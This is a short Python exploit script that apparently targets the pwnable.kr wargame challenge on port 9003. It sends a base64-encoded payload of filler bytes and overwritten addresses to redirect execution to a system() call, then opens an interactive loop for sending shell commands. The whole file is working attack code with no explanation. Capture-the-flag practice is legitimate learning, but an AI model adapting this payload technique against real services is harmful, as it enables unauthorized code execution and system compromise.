import socket
from base64 import b64encode
from struct import pack

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("pwnable.kr", 9003))

print s.recv(15)

after_decode = 0x811eb40
call_system = 0x08049284
payload = "A"*4
payload += pack("<I", call_system)
payload += pack("<I", after_decode)
payload = b64encode(payload)
s.send(payload + "\r\n")

s.send(payload)

s.settimeout(0.5)
while True:
	try: print s.recv(512)
	except socket.error: s.send(raw_input() + "\n")



